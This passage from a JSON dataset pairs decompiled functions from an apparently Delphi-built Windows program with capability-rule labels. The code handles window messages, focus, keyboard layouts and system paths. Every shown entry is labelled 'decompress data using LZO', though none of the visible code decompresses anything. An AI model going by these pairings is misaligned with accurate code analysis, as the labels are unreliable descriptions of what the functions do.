}\n            goto code_r0x00464298;\n        }\n        if (iVar4 == 0x1f) {\n            iVar4 = fcn.00466ca8();\n            iVar5 = sub.user32.dll_GetCapture();\n            if (((iVar4 == iVar5) && (*0x4a4850 != 0)) && (*(*0x4a4850 + 0x30) == in_EAX)) {\n                fcn.004601fc(0);\n            }\n            goto code_r0x00464298;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.00471968();\n            if (((piVar3 != NULL) && (((*(piVar3 + 7) & 0x10) == 0 || (piVar3[0xc] == 0)))) &&\n               (cVar1 = (**(*piVar3 + 0xf8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x00464298;\n        }\n        if (iVar4 != 8) goto code_r0x00464298;\n        uVar2 = *(in_EAX + 0x15) & 0x20;\n    }\n    else {\n        if (0xb047 < iVar4) {\n            if (iVar4 == 0xb04a) {\n                if (param_2[1] != '\\0') {\n                    fcn.00468048();\n                }\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                (**(*in_EAX + 0xb0))();\n                *in_FS_OFFSET = iStack72;\n                if (param_2[1] != '\\0') {\n                    fcn.00468048();\n                }\n                return;\n            }\n            if (((iVar4 == 0xb04e) && ((*(in_EAX + 7) & 0x10) != 0)) && (**0x4a5174 != NULL)) {\n                iStack72 = 0x463e76;\n                iStack72 = fcn.00466ca8();\n                (***0x4a5174)();\n                fcn.00466ca8();\n                sub.user32.dll_SetWindowPos();\n            }\n            goto code_r0x00464298;\n        }\n        if (iVar4 == 0xb047) {\n            piVar3 = fcn.00471968();\n            if ((piVar3 != NULL) && (piVar3 != in_EAX)) {\n                fcn.004601fc(param_2[2]);\n            }\n            goto code_r0x00464298;\n        }\n        if (9 < iVar4 - 0x100U) {\n            if (iVar4 - 0x200U < 0xb) {\n                if (iVar4 == 0x200) {\n                    fcn.00418198();\n                    fcn.0045e9d4();\n                    iVar4 = fcn.0045bcf0();\n                    *0x4a4850 = iVar4;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0045d4bc();\n                    }\n                    if (iVar4 != in_EAX[0x8f]) {\n                        if ((((in_EAX[0x8f] != 0) && (*0x4a4850 == 0)) ||\n                            ((*0x4a4850 != 0 && (in_EAX[0x8f] == *0x4a4850)))) ||\n                           ((*0x4a4850 != 0 && (*(*0x4a4850 + 0x30) == in_EAX[0x8f])))) {\n                            fcn.004601fc(0);\n                        }\n                        if (in_EAX[0x8f] != 0) {\n                            fcn.0041f984();\n                        }\n                        in_EAX[0x8f] = iVar4;\n                        if (iVar4 != 0) {\n                            fcn.0041f744();\n                        }\n                        if (((in_EAX[0x8f] != 0) && (*0x4a4850 == 0)) ||\n                           ((*0x4a4850 != 0 && (in_EAX[0x8f] == *0x4a4850)))) {\n                            iStack72 = 0x464113;\n                            fcn.004601fc(0);\n                        }\n                    }\n                    if (*(in_EAX + 0x8e) == '\\0') {\n                        *(in_EAX + 0x8e) = 1;\n                        fcn.00466ca8();\n                        iStack72 = 0x464152;\n                        sub.comctl32.dll__TrackMouseEvent();\n                    }\n                }\n                cVar1 = fcn.00463cf0();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00466fb4();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    iStack72 = param_2[1];\n                    uVar6 = fcn.00466ca8(*param_2);\n                    sub.user32.dll_DefWindowProcA(uVar6);\n                    return;\n                }\n            }\n            else if (iVar4 - 0x200U == 0xa3) {\n                *(in_EAX + 0x8e) = 0;\n                if (in_EAX[0x8f] == 0) {\n                    fcn.004601fc(0);\n                }\n                else {\n                    fcn.004601fc(0);\n                }\n                in_EAX[0x8f] = 0;\n            }\n            goto code_r0x00464298;\n        }\n        uVar2 = fcn.0045f770();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x00464298:\n    fcn.004602d8();\n    if (*param_2 == 0x128) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1781
    },
    "004652b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00465315)\n\nvoid fcn.004652b0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4653cf;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x4a5178 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00479dd0();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004058fc(0);\n            uVar2 = fcn.004058fc(iVar3, uVar2);\n            in_stack_ffffffc4 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                piVar4 = fcn.00479bd0();\n                iVar3 = (**(*piVar4 + 0x14))();\n                puVar1 = puStack28;\n                if (iVar3 != 0) {\n                    in_stack_ffffffc4 = *(**0x4a514c + 0x3c);\n                    if (*(in_EAX + 0x1b8) != '\\0') {\n                        piVar4 = fcn.00479bd0();\n                        iVar3 = (**(*piVar4 + 0x54))();\n                        if (-1 < iVar3) {\n                            piVar4 = fcn.00479bd0();\n                            in_stack_ffffffc4 = (**(*piVar4 + 0x18))();\n                        }\n                    }\n                    sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffc4, 1);\n                    puVar1 = puStack28;\n                }\n            }\n        }\n        puStack28 = puVar1;\n        fcn.00466ca8();\n        fcn.0046c01c();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.0040546c(0x4653d6);\n    return;\n}\n",
        "token_count": 636
    },
    "004653e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00465441)\n\nvoid fcn.004653e0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffbc;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4654af;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x4a5178 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00479dd0();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004058fc(0);\n            uVar2 = fcn.004058fc(iVar3, uVar2);\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                in_stack_ffffffbc = *(**0x4a514c + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffbc, 1);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        puVar1 = puStack28;\n        if (*(in_EAX + 0x1b8) == '\\0') {\n            fcn.00466ca8();\n            fcn.0046c000();\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.0040546c(0x4654b6);\n    return;\n}\n",
        "token_count": 495
    },
    "00467e64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467e64(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00471968();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            fcn.004601fc(0);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    fcn.004601fc(0);\n    return;\n}\n",
        "token_count": 134
    },
    "00468478": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00468478(int32_t param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar4 = param_2[3];\n    *(in_EAX + 0x96) = 1;\n    uStack56 = 0x46865c;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.0045ef74();\n    fcn.004602a4();\n    iVar2 = fcn.00479980();\n    if (iVar2 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.00479980();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar2 = fcn.0047998c();\n    if (iVar2 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.0047998c();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar2 = fcn.00479974();\n    if (var_18h < iVar2) {\n        var_18h = fcn.00479974();\n    }\n    iVar2 = fcn.00479968();\n    if (iVar4 + 4 < iVar2) {\n        fcn.00479968();\n    }\n    uVar3 = fcn.00466ca8(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar3);\n    iVar4 = sub.kernel32.dll_GetTickCount_1();\n    if (iVar4 - var_4h[0x97] < 0xfb) {\n        bVar1 = false;\n    }\n    else {\n        if (param_1 != 0) {\n            param_1 = *(param_1 + -4);\n        }\n        bVar1 = param_1 < 100;\n    }\n    if ((bVar1) && (*0x4a478c != NULL)) {\n        sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n        if (var_8h != 0) {\n            sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n            if (var_8h == 0) {\n                fcn.0046bc38();\n                if (var_14h < var_1ch) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 1;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\n            uVar3 = fcn.00466ca8(100, *(iVar4 * 4 + 0x4a4894) | 0x40000);\n            (**0x4a478c)(uVar3);\n        }\n    }\n    fcn.004638b8();\n    uVar3 = fcn.00466ca8(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x80))();\n    *in_FS_OFFSET = uVar3;\n    iVar4 = sub.kernel32.dll_GetTickCount_1(0x468663);\n    var_4h[0x97] = iVar4;\n    *(var_4h + 0x96) = 0;\n    return;\n}\n",
        "token_count": 940
    },
    "0046aa78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046aa78(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46aa8a;\n    fcn.004058ec();\n    uStack24 = 0x46aae7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < in_EAX) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x46aaee;\n    uStack24 = 0x46aae6;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 261
    },
    "00471e7c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471e7c(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x472056\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.004721f4();\n            break;\n        case 1:\n            fcn.004721f4();\n            break;\n        case 2:\n            fcn.00471d84();\n            fcn.004721f4();\n            break;\n        case 3:\n            fcn.00471d84();\n            fcn.004721f4();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.004721f4();\n            }\n            else {\n                fcn.00471e1c(&stack0xfffffffc);\n                fcn.004721f4();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.004721f4();\n                }\n                else {\n                    fcn.00471e1c(&stack0xfffffffc);\n                    fcn.004721f4();\n                }\n            }\n            break;\n        case 6:\n            fcn.004721f4();\n            break;\n        case 7:\n            fcn.004721f4();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar3 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar3;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar3 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar3;\n        }\n        else {\n            iVar3 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n            iVar2 = sub.kernel32.dll_GetTickCount_1();\n            if (iVar2 - var_14h < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_1(*(in_EAX + 0x20) - (iVar2 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.004721f4();\n            }\n            else if (iVar1 == 1) {\n                fcn.004721f4();\n            }\n            else if (iVar1 == 2) {\n                fcn.004721f4();\n            }\n            else if (iVar1 == 3) {\n                fcn.004721f4();\n            }\n            (**(**(in_EAX + 4) + 0x8c))();\n            var_14h = iVar2;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.004721f4();\n            }\n            else if (iVar1 == 1) {\n                fcn.004721f4();\n            }\n            else if (iVar1 == 2) {\n                fcn.004721f4();\n            }\n            else if (iVar1 == 3) {\n                fcn.004721f4();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 894
    },
    "00479508": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0047956c)\n// WARNING: Removing unreachable block (ram,0x0047958c)\n// WARNING: Removing unreachable block (ram,0x00479595)\n// WARNING: Removing unreachable block (ram,0x0047959a)\n// WARNING: Removing unreachable block (ram,0x004795a7)\n// WARNING: Removing unreachable block (ram,0x004795ac)\n// WARNING: Removing unreachable block (ram,0x004795b9)\n\nvoid __fastcall fcn.00479508(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4795dd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.0045eeb4();\n        fcn.0040555c();\n        fcn.004058fc();\n        fcn.0045eec4();\n        fcn.0045ef74();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.00473fe4();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4795e4;\n    uStack28 = 0x4795dc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 378
    },
    "0047b4a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047b4a4(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47bb2f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    param_2[3] = 0;\n    iVar7 = *(*(in_EAX + 0xb0) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar7 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.00419610();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = iStack36;\n                return;\n            }\n            iVar7 = iVar7 + -1;\n            puVar1 = puStack28;\n        } while (iVar7 != 0);\n    }\n    fcn.0047b358();\n    iVar7 = *param_2;\n    if (0x53 < iVar7) {\n        if (iVar7 < 0xb018) {\n            if (iVar7 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar7 = fcn.00466ca8(),  iVar7 != 0)) {\n                    uVar5 = fcn.00466ca8();\n                    iVar7 = sub.user32.dll_IsWindowEnabled(uVar5);\n                    if (iVar7 != 0) {\n                        uVar5 = fcn.00466ca8();\n                        iVar7 = sub.user32.dll_IsWindowVisible(uVar5);\n                        if (iVar7 != 0) {\n                            *0x4a48f0 = 0;\n                            uVar5 = sub.user32.dll_GetFocus();\n                            uVar6 = fcn.00466ca8();\n                            sub.user32.dll_SetFocus(uVar6);\n                            fcn.004601fc(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar5);\n                            *0x4a48f0 = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 < 0xb001) {\n                if (iVar7 == 0xb000) {\n                    if (*(in_EAX + 0x13a) != 0) {\n                        (**(in_EAX + 0x138))();\n                    }\n                    if ((*(*0x4ab078 + 0x44) != 0) && (cVar2 = fcn.0047ddf4(),  cVar2 != '\\0')) {\n                        iStack36 = fcn.00466ca8();\n                        iVar7 = sub.user32.dll_IsWindowEnabled();\n                        if ((iVar7 == 0) && (iVar7 = fcn.00466ca8(),  iVar7 != *0x4ab0a0)) {\n                            iStack36 = *0x4ab0a0;\n                            sub.user32.dll_SetFocus();\n                        }\n                    }\n                    *0x4ab0a0 = 0;\n                    goto code_r0x0047bb25;\n                }\n                if (iVar7 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.0047bb68();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.0047bc48();\n                    }\n                    else {\n                        fcn.0047b41c(&stack0xfffffffc);\n                    }\n                    goto code_r0x0047bb25;\n                }\n                if (iVar7 - 0x132U < 7) {\n                    iVar7 = sub.user32.dll_SendMessageA(param_2[2], iVar7 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar7;\n                    goto code_r0x0047bb25;\n                }\n                if (iVar7 - 0x132U == 0x1e8) {\n                    fcn.00452050();\n                    fcn.004521b4();\n                    goto code_r0x0047bb25;\n                }\n            }\n            else {\n                if (iVar7 == 0xb001) {\n                    *0x4ab0a0 = sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n                    if (*(in_EAX + 0x132) != 0) {\n                        (**(in_EAX + 0x130))();\n                    }\n                    goto code_r0x0047bb25;\n                }\n                if (iVar7 == 0xb016) {\n                    cVar2 = fcn.0047bff4();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x0047bb25;\n                }\n            }\n        }\n        else if (iVar7 < 0xb021) {\n            if (iVar7 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.0047c234(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.0047c290(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 == 0xb01a) {\n                iVar7 = fcn.00471334();\n                if (((iVar7 == 0) && (iVar7 = sub.user32.dll_GetFocus(),  iVar7 == *(in_EAX + 0x30))) &&\n                   (iVar7 = fcn.00471658(),  iVar7 != 0)) {\n                    sub.user32.dll_SetFocus(iVar7);\n                }\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 == 0xb01f) goto code_r0x0047ba52;\n        }\n        else {\n            if (iVar7 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb8);\n                }\n                else {\n                    *(in_EAX + 0xb8) = param_2[2];\n                }\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 - 0xb03fU < 2) {\n                uVar4 = fcn.0047d844();\n                param_2[3] = uVar4 & 0x7f;\n                goto code_r0x0047bb25;\n            }\n        }\n        goto code_r0x0047bb1e;\n    }\n    if (iVar7 == 0x53) {\ncode_r0x0047ba52:\n        fcn.0047c660();\n        goto code_r0x0047bb25;\n    }\n    if (iVar7 < 0x12) {\n    // switch table (17 cases) at 0x47b548\n        switch(iVar7) {\n        case 0:\n            fcn.0041f498();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n            goto code_r0x0047bb1e;\n        case 5:\n            if (param_2[1] == 1) {\n                *0x4ab088 = 1;\n            }\n            break;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.0047b41c(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.0047b41c(&stack0xfffffffc);\n                if ((*(in_EAX + 0xb4) == 0) && (*0x4a4908 == '\\0')) {\n                    uVar5 = fcn.004714f8();\n                    *(in_EAX + 0xb4) = uVar5;\n                }\n                fcn.0047b010();\n            }\n            else {\n                if ((*0x4a4908 == '\\0') && (fcn.0047b068(),  *(in_EAX + 0xb4) != 0)) {\n                    fcn.004715bc();\n                    *(in_EAX + 0xb4) = 0;\n                }\n                fcn.0047b41c(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar7 = fcn.00471334();\n            if (iVar7 == 0) {\n                fcn.0047b41c(&stack0xfffffffc);\n            }\n            else {\n                fcn.0047b458(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.004785dc();\n            }\n            break;\n        default:\n            param_2[3] = 1;\n        }\n    }\n    else {\n        if (iVar7 < 0x1d) {\n            if (iVar7 == 0x1c) {\n                fcn.0047b41c(&stack0xfffffffc);\n                *(in_EAX + 0xa5) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.0047b008();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.0047b068();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 == 0x14) {\n                *param_2 = 0x27;\n                fcn.0047b41c(&stack0xfffffffc);\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 == 0x16) {\n                if (param_2[1] != 0) {\n                    fcn.0040f21c();\n                    fcn.00405378();\n                }\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 == 0x1a) {\n                fcn.0046bd34();\n                fcn.0047b3b0();\n                fcn.0047b41c(&stack0xfffffffc);\n                goto code_r0x0047bb25;\n            }\n        }\n        else {\n            if (iVar7 == 0x1d) {\n                fcn.0047a59c();\n                fcn.0047b41c(&stack0xfffffffc);\n                goto code_r0x0047bb25;\n            }\n            if (iVar7 == 0x37) {\n                iVar7 = fcn.0047bb4c();\n                param_2[3] = iVar7;\n                goto code_r0x0047bb25;\n            }\n        }\ncode_r0x0047bb1e:\n        fcn.0047b41c(&stack0xfffffffc);\n    }\ncode_r0x0047bb25:\n    *in_FS_OFFSET = iStack36;\n    return;\n}\n",
        "token_count": 2685
    },
    "0047bdb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047bdb4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar auStack268 [244];\n    int32_t iStack24;\n    \n    if ((*(in_EAX + 0xac) == '\\0') || (cVar1 = fcn.0047ddf4(),  cVar1 != '\\0')) {\n        fcn.004054c0();\n        return;\n    }\n    sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack268, 0x100);\n    fcn.0040555c();\n    iStack24 = *param_2;\n    iVar2 = iStack24;\n    if (iStack24 != 0) {\n        iVar2 = *(iStack24 + -4);\n    }\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 223
    },
    "0047e20c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e20c(uint param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    param_2 = param_2 + 1;\n    fcn.004058fc();\n    fcn.0047e0a8(param_2);\n    return;\n}\n",
        "token_count": 89
    },
    "0047f58c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0047f58c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x47f5a8;\n    fcn.004058ec();\n    puStack32 = 0x47f5b0;\n    fcn.004058ec();\n    uStack36 = 0x47f615;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack32 = &stack0xfffffffc;\n    if (0 < in_EAX) {\n        do {\n            fcn.00405654();\n            fcn.00405894();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x47f61c;\n    uStack36 = 0x47f614;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 284
    },
    "00480138": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480138(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0040a9b8(param_1);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x104);\n    fcn.00405664();\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*in_EAX + -1 + iVar2) != '\\\\') {\n        fcn.00405738();\n    }\n    fcn.0040aa04();\n    return;\n}\n",
        "token_count": 156
    },
    "004819c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004819c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_15ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack384 = 0x4819f1;\n    fcn.00405f08();\n    uStack388 = 0x481b27;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    puStack396 = 0x481a0a;\n    puStack384 = &stack0xfffffffc;\n    fcn.0040546c();\n    puStack396 = 0x481a12;\n    fcn.00481924();\n    puStack396 = 0x481a1f;\n    fcn.00405738();\n    puStack396 = 0x481a27;\n    cVar1 = fcn.0040a18c();\n    if (cVar1 != '\\0') {\n        puStack396 = 0x481a3a;\n        fcn.0040e72c();\n        puStack396 = 0x481a45;\n        fcn.00405504();\n        puStack396 = 0x481a58;\n        fcn.00405784();\n        puStack396 = 0x481a6e;\n        iVar2 = fcn.0040a384();\n        if (iVar2 == 0) {\n            uStack400 = 0x481ac3;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                uStack404 = 0x481b64;\n                fcn.00405800();\n                iVar2 = fcn.0040a3d4();\n            } while (iVar2 == 0);\n            *in_FS_OFFSET = uStack404;\n            fcn.0040a3f8(0x481aca);\n            return;\n        }\n        puStack396 